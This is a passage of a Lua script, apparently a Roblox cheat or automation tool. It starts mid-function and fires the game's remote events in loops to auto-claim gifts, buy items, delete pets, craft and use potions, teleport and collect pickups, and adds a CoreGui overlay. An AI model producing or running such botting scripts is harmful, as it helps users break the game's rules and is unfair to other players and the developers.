                            local giftsFolder = workspace.Rendered:FindFirstChild(""Gifts"")
                            if not giftsFolder or #giftsFolder:GetChildren() == 0 then
                                break
                            end
                            
                            -- Process each gift in the folder
                            for _, gift in pairs(giftsFolder:GetChildren()) do
                                -- Get the gift's name/UUID
                                local giftId = gift.Name
                                
                                -- Claim the gift using the remote event
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimGift"", giftId)

                                task.wait(1)
                                
                                -- Destroy the gift after claiming
                                gift:Destroy()
                                
                                -- Short wait to prevent overwhelming the server
                                task.wait(0.01)
                            end
                        end
                    end
                end)
                
                -- Wait before checking again (every 30 seconds)
                task.wait(30)
            end
        end)
    end
    
    return AutoMysteryBoxes_Toggle
end


-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Buy Shop Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoBuyingShopItems = false
local autoBuyingShopItemsThread = nil

local function toggleAutoBuyShopItems()
    isAutoBuyingShopItems = not isAutoBuyingShopItems
    
    if isAutoBuyingShopItems then
        
        -- Start the auto buying thread
        autoBuyingShopItemsThread = spawn(function()
            while isAutoBuyingShopItems do
                -- Define shops and their items for efficient iteration
                local shops = {
                    [""alien-shop""] = {1, 2, 3},
                    [""shard-shop""] = {1, 2, 3}
                }
                
                -- Check if we have minimum gems before attempting purchases
                local currentGems = GetCurrentGems()
                if currentGems < Low_Gems then
                    task.wait(60) -- Wait a minute before checking again
                    continue
                end
                
                -- Process each shop
                for shopName, items in pairs(shops) do
                    -- Process each item ID in this shop
                    for _, itemId in ipairs(items) do
                        -- Verify we still have enough gems
                        if GetCurrentGems() >= Low_Gems then
                            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                ""BuyShopItem"", 
                                shopName, 
                                itemId
                            )
                            task.wait(0.5) -- Wait between purchases
                        else
                            task.wait(30) -- If below threshold, wait and continue loop
                            break
                        end
                    end
                    
                    -- Check if toggle was turned off during purchases
                    if not isAutoBuyingShopItems then 
                        break 
                    end
                    
                    task.wait(0.5)
                end
                
                -- Wait between shop purchase cycles
                task.wait(60) -- Wait 1 minute between full cycles
            end
        end)
    else
        -- Kill the thread if it exists
        if autoBuyingShopItemsThread then
            task.cancel(autoBuyingShopItemsThread)
            autoBuyingShopItemsThread = nil
        end
    end
    
    return isAutoBuyingShopItems
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Delete Pets ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoDeletingPets = false
local autoDeletingPetsThread = nil

local function toggleAutoPetDeletion()
    isAutoDeletingPets = not isAutoDeletingPets
    
    if isAutoDeletingPets then
        -- Start a new thread for continuous pet deletion
        autoDeletingPetsThread = spawn(function()
            while isAutoDeletingPets do
                -- Use pcall for error handling
                pcall(function()
                    -- Get fresh data
                    local freshData = LocalDataService:Get()
                    
                    -- Create a lookup table for all pet IDs in teams
                    local petsInTeams = {}
                    for _, team in ipairs(freshData.Teams) do
                        for _, petId in ipairs(team.Pets) do
                            petsInTeams[petId] = true
                        end
                    end
                    
                    -- Track pets with shiny versions for auto-delete toggling later
                    local petsWithShinyVersions = {}
                    
                    -- Check which pets have shiny versions
                    for _, petName in ipairs(petsToDelete) do
                        local hasShiny = false
                        for _, pet in ipairs(freshData.Pets) do
                            if pet.Name == petName and pet.Shiny then
                                hasShiny = true
                                break
                            end
                        end
                        
                        if hasShiny then
                            petsWithShinyVersions[petName] = true
                        end
                    end
                    
                    -- Check and track all pets by name, separating normal and shiny
                    local petsByName = {}
                    
                    -- First pass: organize pets by name to determine counts and find shiny versions
                    for _, pet in ipairs(freshData.Pets) do
                        -- Skip pets that are in teams or locked
                        if petsInTeams[pet.Id] or pet.Locked then
                            continue
                        end
                        
                        -- Check if this pet is in our deletion list
                        local shouldTrack = false
                        for _, petName in ipairs(petsToDelete) do
                            if pet.Name == petName then
                                shouldTrack = true
                                break
                            end
                        end
                        
                        if shouldTrack then
                            -- Initialize the pet tracking if not exists
                            if not petsByName[pet.Name] then
                                petsByName[pet.Name] = {
                                    normal = {
                                        pets = {},
                                        count = 0
                                    },
                                    shiny = {
                                        exists = false,
                                        pets = {},
                                        count = 0
                                    }
                                }
                            end
                            
                            -- Add to appropriate category
                            if pet.Shiny then
                                petsByName[pet.Name].shiny.exists = true
                                table.insert(petsByName[pet.Name].shiny.pets, pet)
                                petsByName[pet.Name].shiny.count = petsByName[pet.Name].shiny.count + (pet.Amount or 1)
                            else
                                table.insert(petsByName[pet.Name].normal.pets, pet)
                                petsByName[pet.Name].normal.count = petsByName[pet.Name].normal.count + (pet.Amount or 1)
                            end
                        end
                    end
                    
                    -- Process each pet name to check for shiny crafting opportunity
                    for petName, data in pairs(petsByName) do
                        -- Check if we need to make a shiny (no shiny exists and we have 16+ normal pets)
                        if not data.shiny.exists and data.normal.count >= 16 then
                            -- Find best candidate for shiny crafting (preferably a stacked pet)
                            local bestCandidate = nil
                            
                            -- First try to find a stacked pet with at least 16
                            for _, pet in ipairs(data.normal.pets) do
                                if pet.Amount and pet.Amount >= 16 then
                                    bestCandidate = pet
                                    break
                                end
                            end
                            
                            -- If no stacked pet has 16+, we'll need to use the first pet we find
                            if not bestCandidate and #data.normal.pets > 0 then
                                bestCandidate = data.normal.pets[1]
                            end
                            
                            -- Execute the shiny crafting if we have a candidate
                            if bestCandidate then
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                    ""MakePetShiny"", 
                                    bestCandidate.Id
                                )
                                
                                -- Wait for the operation to complete
                                task.wait(1)
                                
                                -- Refresh data after crafting a shiny
                                freshData = LocalDataService:Get()
                                
                                -- Update our tracking of pets with shiny versions
                                petsWithShinyVersions[petName] = true
                                
                                -- Recreate teams lookup after refresh
                                petsInTeams = {}
                                for _, team in ipairs(freshData.Teams) do
                                    for _, petId in ipairs(team.Pets) do
                                        petsInTeams[petId] = true
                                    end
                                end
                            end
                        end
                    end
                    
                    -- Now reorganize for deletion processing with updated data
                    local petsByNameAndType = {}
                    
                    for _, pet in ipairs(freshData.Pets) do
                        -- Skip pets that are in any team
                        if petsInTeams[pet.Id] then
                            continue
                        end
                        
                        -- Skip locked pets
                        if pet.Locked then
                            continue
                        end
                        
                        -- Check if this pet is in our deletion list
                        local shouldTrack = false
                        for _, petName in ipairs(petsToDelete) do
                            if pet.Name == petName then
                                shouldTrack = true
                                break
                            end
                        end
                        
                        -- Check if we should skip deletion for normal pets where no shiny exists yet
                        if shouldTrack and not pet.Shiny then
                            -- Check if we have a shiny version in the data
                            local shinyExists = petsWithShinyVersions[pet.Name] or false
                            if not shinyExists then
                                -- Re-check in fresh data
                                for _, checkPet in ipairs(freshData.Pets) do
                                    if checkPet.Name == pet.Name and checkPet.Shiny then
                                        shinyExists = true
                                        petsWithShinyVersions[pet.Name] = true
                                        break
                                    end
                                end
                            end
                            
                            -- If no shiny exists yet, we need 16+ pets to make a shiny, so don't delete
                            if not shinyExists then
                                -- Count how many we have of this pet
                                local totalCount = 0
                                for _, countPet in ipairs(freshData.Pets) do
                                    if countPet.Name == pet.Name and not countPet.Shiny and not petsInTeams[countPet.Id] and not countPet.Locked then
                                        totalCount = totalCount + (countPet.Amount or 1)
                                    end
                                end
                                
                                -- Only delete if we have more than 16 of this pet
                                if totalCount <= 16 then
                                    shouldTrack = false
                                end
                            end
                        end
                        
                        -- Only track pets in our deletion list
                        if shouldTrack then
                            -- Create a key that combines name and shiny status
                            local petKey = pet.Name .. (pet.Shiny and ""_shiny"" or ""_normal"")
                            
                            if not petsByNameAndType[petKey] then
                                petsByNameAndType[petKey] = {
                                    xpPets = {},
                                    stackedPets = {},
                                    totalCount = 0,
                                    isShiny = pet.Shiny,
                                    name = pet.Name
                                }
                            end
                            
                            -- Check if it's a stacked pet (has Amount) or individual XP pet
                            if pet.Amount then
                                table.insert(petsByNameAndType[petKey].stackedPets, pet)
                                petsByNameAndType[petKey].totalCount = petsByNameAndType[petKey].totalCount + pet.Amount
                            else
                                table.insert(petsByNameAndType[petKey].xpPets, pet)
                                petsByNameAndType[petKey].totalCount = petsByNameAndType[petKey].totalCount + 1
                            end
                        end
                    end
                    
                    -- Process each pet type for deletion
                    for petKey, petData in pairs(petsByNameAndType) do
                        -- Use appropriate threshold based on shiny status
                        local threshold = petData.isShiny and shinyKeepThreshold or petKeepThreshold
                        local totalToDelete = petData.totalCount - threshold
                        
                        -- Only proceed if we need to delete pets
                        if totalToDelete > 0 then
                            -- First delete individual XP pets (prioritize these)
                            local refreshNeeded = false
                            
                            for i, xpPet in ipairs(petData.xpPets) do
                                if totalToDelete > 0 then
                                    -- Double check that this pet is not in a team
                                    if not petsInTeams[xpPet.Id] then
                                        -- Delete this individual pet
                                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                            ""DeletePet"", 
                                            xpPet.Id,
                                            1, 
                                            false
                                        )
                                        
                                        totalToDelete = totalToDelete - 1
                                        task.wait(0.3) -- Wait for deletion to process
                                        refreshNeeded = true
                                        
                                        -- Refresh data after each 3 deletions to avoid too many refreshes
                                        if i % 3 == 0 or totalToDelete <= 0 then
                                            -- Refresh data and team info
                                            freshData = LocalDataService:Get()
                                            petsInTeams = {}
                                            for _, team in ipairs(freshData.Teams) do
                                                for _, petId in ipairs(team.Pets) do
                                                    petsInTeams[petId] = true
                                                end
                                            end
                                            refreshNeeded = false
                                        end
                                    end
                                else
                                    break
                                end
                            end
                            
                            -- Refresh data if needed before handling stacked pets
                            if refreshNeeded then
                                freshData = LocalDataService:Get()
                                petsInTeams = {}
                                for _, team in ipairs(freshData.Teams) do
                                    for _, petId in ipairs(team.Pets) do
                                        petsInTeams[petId] = true
                                    end
                                end
                            end
                            
                            -- Recalculate remaining pets to delete after refreshing data
                            if totalToDelete > 0 then
                                -- Find all stacked pets again with fresh data
                                local stackedPets = {}
                                for _, pet in ipairs(freshData.Pets) do
                                    -- Match both name and shiny status, make sure not in team
                                    local isRightType = pet.Name == petData.name and (pet.Shiny == petData.isShiny)
                                    if isRightType and pet.Amount and not petsInTeams[pet.Id] and not pet.Locked then
                                        table.insert(stackedPets, pet)
                                    end
                                end
                                
                                -- Then handle stacked pets if we still need to delete more
                                for i, stackedPet in ipairs(stackedPets) do
                                    if totalToDelete > 0 then
                                        -- Calculate how many to delete from this stack
                                        local amountToDelete = math.min(stackedPet.Amount, totalToDelete)
                                        
                                        -- Delete from this stacked pet
                                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                            ""DeletePet"", 
                                            stackedPet.Id,
                                            amountToDelete, 
                                            false
                                        )
                                        
                                        totalToDelete = totalToDelete - amountToDelete
                                        task.wait(0.3) -- Wait for deletion to process
                                        
                                        -- Refresh data after each deletion of stacked pets
                                        if i % 2 == 0 or totalToDelete <= 0 then
                                            freshData = LocalDataService:Get()
                                            petsInTeams = {}
                                            for _, team in ipairs(freshData.Teams) do
                                                for _, petId in ipairs(team.Pets) do
                                                    petsInTeams[petId] = true
                                                end
                                            end
                                        end
                                    else
                                        break
                                    end
                                end
                            end
                        end
                    end
                    
                    -- After deletion, check which pets should be toggled for auto-delete
                    freshData = LocalDataService:Get() -- Get fresh data again
                    
                    -- Enable auto-delete for pets where we have a shiny version
                    for petName in pairs(petsWithShinyVersions) do
                        -- Check if this pet is already set for auto-deletion
                        local isAlreadyAutoDelete = freshData.AutoDelete and freshData.AutoDelete[petName]
                        
                        -- If not set for auto-delete yet, toggle it
                        if not isAlreadyAutoDelete then
                            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                ""ToggleAutoDelete"", 
                                petName
                            )
                            task.wait(0.2) -- Small wait between toggles
                        end
                    end
                end)
                
                -- Wait before checking again
                task.wait(30) -- Check every 30 seconds
            end
        end)
    end
    
    return isAutoDeletingPets
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Craft Potion Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isAutoCraftingPotions = false
local autoCraftingPotionsThread = nil

local function toggleAutoCraftPotions()
    isAutoCraftingPotions = not isAutoCraftingPotions
    
    if isAutoCraftingPotions then
        autoCraftingPotionsThread = spawn(function()
            while isAutoCraftingPotions do
                -- Check gem threshold first
                local currentGems = GetCurrentGems()
                
                -- Only proceed if we have enough gems
                if currentGems >= Low_Gems then
                    local madeCraft = false
                    local data = LocalDataService:Get()
                    
                    -- Check from lowest to highest tier
                    for tier = 2, 5 do
                        for _, potionType in ipairs(potionTypes) do
                            -- Find source potion in inventory
                            local sourceTier = tier - 1
                            local required = craftingRequirements[tier]
                            local available = 0
                            
                            for _, potion in ipairs(data.Potions or {}) do
                                if potion.Name == potionType and potion.Level == sourceTier then
                                    available = potion.Amount or 0
                                    break
                                end
                            end
                            
                            -- Craft if possible and check gems again before each craft
                            if available >= required and GetCurrentGems() >= Low_Gems then
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                    ""CraftPotion"", potionType, tier, true)
                                madeCraft = true
                                task.wait(0.3)
                                data = LocalDataService:Get() -- Refresh data
                            end
                        end
                    end
                    
                    -- Wait based on crafting activity
                    task.wait(madeCraft and 0.5 or 10)
                else
                    -- If not enough gems, wait longer before checking again
                    task.wait(15)
                end
            end
        end)
    end
    
    return isAutoCraftingPotions
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Use Potion Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function isPotionActive(potionType)
    -- Get fresh data every time we check
    local freshData = LocalDataService:Get()
    
    -- Check if ActivePotions exists and has the specific potion
    if freshData.ActivePotions and 
       type(freshData.ActivePotions) == ""table"" and
       freshData.ActivePotions[potionType] and 
       freshData.ActivePotions[potionType].Active then
        return true
    end
    
    return false
end

-- Function to get the highest level potion of a specific type from inventory
local function getHighestLevelPotion(potionType)
    -- Get fresh data every time we check inventory
    local freshData = LocalDataService:Get()
    local highestLevel = 0
    local highestLevelPotion = nil
    
    -- Check if we have potions in inventory
    if freshData.Potions and #freshData.Potions > 0 then
        for _, potion in ipairs(freshData.Potions) do
            -- Check if this potion matches the exact type we're looking for
            if potion.Name == potionType and potion.Amount > 0 then
                -- If this potion has a higher level than our current highest, update
                if potion.Level > highestLevel then
                    highestLevel = potion.Level
                    highestLevelPotion = potion
                end
            end
        end
    end
    
    return highestLevelPotion
end

-- Function to use a potion
local function usePotion(potionName, potionLevel)
    -- Use the potion
    game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
        ""UsePotion"", 
        potionName, 
        potionLevel
    )
    
    -- Wait briefly for data to update
    task.wait(0.3)
    
    -- Return true to indicate success
    return true
end

-- Function to toggle auto potion usage
local function toggleAutoUsePotion()
    isAutoUsingPotions = not isAutoUsingPotions
    
    if isAutoUsingPotions then
        -- Start a new thread for continuous potion checking
        autoUsingPotionsThread = spawn(function()
            while isAutoUsingPotions do
                -- Only process potions if auto hatching is enabled AND not temporarily disabled
                if isAutoHatching and not tempDisableHatching then
                    -- First handle regular priority potions
                    for _, potionType in ipairs(priorityPotions) do
                        -- Check with fresh data if potion is active
                        if not isPotionActive(potionType) then
                            -- Get highest level potion with fresh data
                            local bestPotion = getHighestLevelPotion(potionType)
                            
                            -- If we found a potion, use it
                            if bestPotion then
                                usePotion(bestPotion.Name, bestPotion.Level)
                                -- Wait a bit between using different potions
                                task.wait(1)
                            end
                        end
                    end
                    
                    -- Check for Infinity Elixir only when hatching x25 egg
                    if isHatchingX25Egg and not isPotionActive(""Infinity Elixir"") then
                        local infinityPotion = getHighestLevelPotion(""Infinity Elixir"")
                        if infinityPotion then
                            usePotion(infinityPotion.Name, infinityPotion.Level)
                            task.wait(1)
                        end
                    end
                end
                
                -- Wait before checking again
                task.wait(3) -- Check potions every 3 seconds
            end
        end)
    end
    
    return isAutoUsingPotions
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Collection Buffs Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Function to check and use buffs during coin collection
local function useCollectionBuffs()
    -- Get fresh data
    local freshData = LocalDataService:Get()
    
    -- Check if Coins potion is active
    local hasCoinsPotion = false
    if freshData.ActivePotions and type(freshData.ActivePotions) == ""table"" then
        if freshData.ActivePotions[""Coins""] and freshData.ActivePotions[""Coins""].Active then
            hasCoinsPotion = true
        end
    end
    
    -- Check if GoldRush buff is active
    local hasGoldRush = false
    if freshData.ActiveBuffs and type(freshData.ActiveBuffs) == ""table"" then
        for _, buff in ipairs(freshData.ActiveBuffs) do
            if buff.Name == ""GoldRush"" then
                hasGoldRush = true
                break
            end
        end
    end
    
    -- Use Coins potion if not active and we have one
    if not hasCoinsPotion then
        local coinsPotion = getHighestLevelPotion(""Coins"")
        if coinsPotion then
            usePotion(coinsPotion.Name, coinsPotion.Level)
            task.wait(0.5)
        end
    end
    
    -- Use Golden Orb if GoldRush not active and we have some
    if not hasGoldRush and freshData.Powerups and freshData.Powerups[""Golden Orb""] and freshData.Powerups[""Golden Orb""] > 0 then
        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""UseGoldenOrb"")
        task.wait(0.5)
    end
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Collect Pickup ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function toggleAutoCollectPickups()
    isAutoCollectingPickups = not isAutoCollectingPickups
    
    if isAutoCollectingPickups then
        -- Start a new thread for continuous pickup collection
        autoCollectingPickupsThread = spawn(function()
            while isAutoCollectingPickups do
                -- Use pcall for error handling
                pcall(function()
                    -- First, check and use collection buffs
                    useCollectionBuffs()
                    
                    local player = game:GetService(""Players"").LocalPlayer
                    local character = player.Character
                    if character then
                        local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
                        if humanoidRootPart then
                            local isInZen = math.abs(humanoidRootPart.Position.Y - 15975) < 30
                            
                            -- Only collect if in Zen Island
                            if isInZen then
                                -- Loop through all Chunker folders in Rendered
                                for _, chunkerFolder in pairs(workspace.Rendered:GetChildren()) do
                                    if chunkerFolder.Name == ""Chunker"" and chunkerFolder:IsA(""Folder"") then
                                        -- Loop through each UUID object 
                                        for _, uuidObject in pairs(chunkerFolder:GetChildren()) do
                                            -- Check if it's a UUID-like name (contains hyphens)
                                            if typeof(uuidObject) == ""Instance"" and uuidObject.Name:match(""%-"") then
                                                -- This UUID object is the pickup itself
                                                local pickupId = uuidObject.Name
                                                game:GetService(""ReplicatedStorage"").Remotes.Pickups.CollectPickup:FireServer(pickupId)
                                                task.wait(0.05)
                                                uuidObject:Destroy()
                                                task.wait(0.05)
                                            end
                                        end
                                    end
                                end
                            else
                                -- Not in Zen, teleport there
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""Teleport"", ""Workspace.Worlds.The Overworld.Islands.Zen.Island.Portal.Spawn"")
                                task.wait(5) -- Wait for teleport to complete
                            end
                        end
                    end
                end)
                
                -- Wait before checking again
                task.wait(1)
            end
        end)
    end
    
    return isAutoCollectingPickups
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Egg Counter Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function toggleEggCounter()
    isEggCounterEnabled = not isEggCounterEnabled
    
    if isEggCounterEnabled then
        -- Create GUI if not exists
        if not EggCounterGui then

            EggCounterGui = Instance.new(""ScreenGui"")
            EggCounterGui.Name = ""EggCounterGui""
            EggCounterGui.ResetOnSpawn = false
            EggCounterGui.IgnoreGuiInset = true
            EggCounterGui.DisplayOrder = 98 
            
            -- Create fully black background covering the entire screen
            local frame = Instance.new(""Frame"")
            frame.Size = UDim2.new(1, 0, 1, 0)  -- Full screen size
            frame.Position = UDim2.new(0, 0, 0, 0)  -- Starting from top-left corner
            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black
            frame.BackgroundTransparency = 0 -- Black Transparancy
            frame.BorderSizePixel = 0
            frame.Name = ""Frame""
            frame.Parent = EggCounterGui
            
            -- Title label
            local titleLabel = Instance.new(""TextLabel"")
            titleLabel.Size = UDim2.new(1, 0, 0, 50)
            titleLabel.Position = UDim2.new(0, 0, 0.23, 0)  -- Moved up to 30% down
            titleLabel.BackgroundTransparency = 1
            titleLabel.Font = Enum.Font.SourceSansBold
            titleLabel.TextSize = 135  -- Larger text size
            titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red text initially
            titleLabel.Text = ""Hatching Off""
            titleLabel.TextStrokeTransparency = 0
            titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            titleLabel.Name = ""TitleLabel""
            titleLabel.Parent = frame
            
            -- Egg counter label
            local counterLabel = Instance.new(""TextLabel"")
            counterLabel.Size = UDim2.new(1, 0, 0, 50)
            counterLabel.Position = UDim2.new(0, 0, 0.37, 0)  -- Moved up to 40% down
            counterLabel.BackgroundTransparency = 1
            counterLabel.Font = Enum.Font.SourceSansBold
            counterLabel.TextSize = 125
            counterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            counterLabel.Text = """"
            counterLabel.TextWrapped = true
            counterLabel.TextXAlignment = Enum.TextXAlignment.Center
            counterLabel.TextStrokeTransparency = 0
            counterLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            counterLabel.Name = ""CounterLabel""
            counterLabel.Parent = frame
            
            -- Coins counter label
            local coinsLabel = Instance.new(""TextLabel"")
            coinsLabel.Size = UDim2.new(1, 0, 0, 50)
            coinsLabel.Position = UDim2.new(0, 0, 0.52, 0)  -- At 50% down
            coinsLabel.BackgroundTransparency = 1
            coinsLabel.Font = Enum.Font.SourceSansBold
            coinsLabel.TextSize = 125
            coinsLabel.TextColor3 = Color3.fromRGB(255, 215, 0)  -- Gold color for coins
            coinsLabel.Text = ""Coins: 0""
            coinsLabel.TextWrapped = true
            coinsLabel.TextXAlignment = Enum.TextXAlignment.Center
            coinsLabel.TextStrokeTransparency = 0
            coinsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            coinsLabel.Name = ""CoinsLabel""
            coinsLabel.Parent = frame
            
            -- Gems counter label
            local gemsLabel = Instance.new(""TextLabel"")
            gemsLabel.Size = UDim2.new(1, 0, 0, 50)
            gemsLabel.Position = UDim2.new(0, 0, 0.65, 0)  -- At 60% down
            gemsLabel.BackgroundTransparency = 1
            gemsLabel.Font = Enum.Font.SourceSansBold
            gemsLabel.TextSize = 125
            gemsLabel.TextColor3 = Color3.fromRGB(170, 0, 255)  -- Purple color for gems
            gemsLabel.Text = ""Gems: 0""
            gemsLabel.TextWrapped = true
            gemsLabel.TextXAlignment = Enum.TextXAlignment.Center
            gemsLabel.TextStrokeTransparency = 0
            gemsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            gemsLabel.Name = ""GemsLabel""
            gemsLabel.Parent = frame
            
            EggCounterGui.Parent = game:GetService(""CoreGui"")
        else
            EggCounterGui.Enabled = true
        end
        
        -- Start updating the counter in a loop
        spawn(function()
            while isEggCounterEnabled and EggCounterGui do
                local playerData = LocalDataService:Get()
                local titleLabel = EggCounterGui.Frame.TitleLabel
                local counterLabel = EggCounterGui.Frame.CounterLabel
                local coinsLabel = EggCounterGui.Frame.CoinsLabel
                local gemsLabel = EggCounterGui.Frame.GemsLabel
                
                -- Update coins and gems regardless of hatching state
                if playerData then
                    -- Update coins (using your existing GetCurrentCoins function)
                    local currentCoins = GetCurrentCoins()
                    coinsLabel.Text = ""Coins: "" .. FormatNumberCompact(currentCoins)
                    
                    -- Update gems
                    local currentGems = playerData.Gems or 0
                    gemsLabel.Text = ""Gems: "" .. FormatNumberCompact(currentGems)
                end
                
                if CurrentlyHatchingEgg and playerData and playerData.EggsOpened then
                    local eggCount = playerData.EggsOpened[CurrentlyHatchingEgg] or 0
                    titleLabel.Text = ""Currently Hatching""
                    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green
                    counterLabel.Text = CurrentlyHatchingEgg .. "" : "" .. tostring(eggCount)
                else
                    titleLabel.Text = ""Hatching Off""
                    titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red
                    counterLabel.Text = """"
                end
                
                task.wait(1)
                
                -- Break the loop if toggle is turned off
                if not isEggCounterEnabled then break end
            end
        end)
    else
        -- Hide the GUI when toggled off
        if EggCounterGui then
            EggCounterGui.Enabled = false
        end
    end
    
    return isEggCounterEnabled
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Hatch Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Function to extract luck multiplier from text (e.g. ""x5"", ""x10"")
local function getLuckMultiplier(luckText)
    if not luckText then return 0 end
    
    -- Extract number after 'x'
    local multiplier = luckText:match(""x(%d+)"")
    if multiplier then
        return tonumber(multiplier) or 0
    end
    return 0
end

-- Inside findBestEgg function
local function findBestEgg()
